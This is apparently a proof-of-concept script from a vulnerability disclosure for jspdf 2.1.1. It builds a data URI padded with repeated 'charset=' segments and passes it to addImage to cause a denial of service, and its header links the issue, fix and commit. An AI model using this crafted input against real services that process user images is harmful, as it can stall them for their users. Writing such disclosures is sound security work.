/**
 * jspdf@2.1.1
 * Package Manager: npm
 * Link to published package: https://github.com/MrRio/jsPDF
 * Link to GitHub repo: https://github.com/MrRio/jsPDF
 * Severity level: High
 * Module Description: A library to generate PDFs in JavaScript
 * Additional Info: It allows cause a denial of service when adding images.
 * Contacted maintainer?: Yes
 * Open issue?: Yes
 * https://github.com/MrRio/jsPDF/issues/3090
 * https://github.com/MrRio/jsPDF/pull/3091
 * https://github.com/MrRio/jsPDF/commit/d8bb3b39efcd129994f7a3b01b632164144ec43e
 */
const fs = require("fs");
const { jsPDF } = require("jspdf")


function build_blank(n) {
	var ret = "data:/"
	for (var i = 0; i < n; i++) {
		ret += "charset="
	}
	return ret + "!";
}
 
const doc = new jsPDF();
doc.text("Hello world1111!", 10, 10);

var imageData = "data:image/png;base64,"

var Octocat = fs.readFileSync("psb.png", { encoding: "latin1" });
doc.addImage(build_blank(30) + imageData, "test", 10, 40, 180, 180, undefined, "SLOW");


doc.save("a4ffff.pdf"); // will save the file in the current working directory
console.log("type:" + typeof(doc.addImage))
